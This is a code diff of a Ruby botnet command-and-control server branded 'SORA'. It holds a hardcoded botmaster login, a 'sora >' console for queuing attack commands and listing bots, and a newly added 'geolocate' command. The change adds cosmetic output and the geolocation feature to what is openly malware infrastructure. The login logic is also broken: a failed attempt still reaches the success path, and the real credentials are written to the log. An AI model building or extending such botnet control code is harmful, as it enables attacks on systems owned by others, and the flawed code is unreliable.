@@ -1,9 +1,10 @@
 #!/usr/bin/env ruby
-
 require 'socket'
+require './lib/core'
 
-uname = "botmaster"
-password = "ilovedogs"
+
+uname = "botmaster"    # Change this
+password = "ilovedogs" # Change this
 
 def checkAttackCmd(command)
   # TODO Check command arg length, resolve the hostname (if any)
@@ -17,11 +18,12 @@ def writeCmd(command)
   cmdf.close
 end
 
+
 server = TCPServer.new "0.0.0.0", ARGV[0].to_i  # Change this if you want
 cmd = ''
 loop do
   Thread.start(server.accept) do |master|
-    print "[*] Master login connection from #{master.peeraddr[3]}\n"
+    print_status("Master login connection from #{master.peeraddr[3]}")
     master.print "Username: "
     inputted_uname = master.gets
     master.print "Password: "
@@ -30,9 +32,10 @@ loop do
     if inputted_uname.strip! != uname || inputted_pass.strip! != password
       master.puts "Don't try it"
       master.close
-      puts "[*] Master login failed (used #{uname}:#{password})"
+      print_err("Master login failed (used #{uname}:#{password})")
     end
-    puts "[*] Master login successful!"
+    print_good("Master login successful!")
+    master.print "\u001B[2J"
     master.print "
 ███████╗     ██████╗     ██████╗      █████╗
 ██╔════╝    ██╔═══██╗    ██╔══██╗    ██╔══██╗
@@ -40,8 +43,9 @@ loop do
 ╚════██║    ██║   ██║    ██╔══██╗    ██╔══██║
 ███████║    ╚██████╔╝    ██║  ██║    ██║  ██║
 ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝
+".colorize(:red)
 
-Made with <3 by AM-77\n\n"
+    master.puts "Made with <3 by AM-77\n\n"
     while (cmd != 'exit')
       begin
         master.print "sora > "
@@ -86,6 +90,8 @@ Made with <3 by AM-77\n\n"
         elsif cmd == "botlist"
           botlist = File.open("bots.txt", 'r')
           master.puts botlist.read
+        elsif cmd.include? "geolocate"
+          geolocate(cmd.split(" ")[1], master)
         else
           master.puts "\033[31m Unknown command: #{cmd}\033[0m"
         end
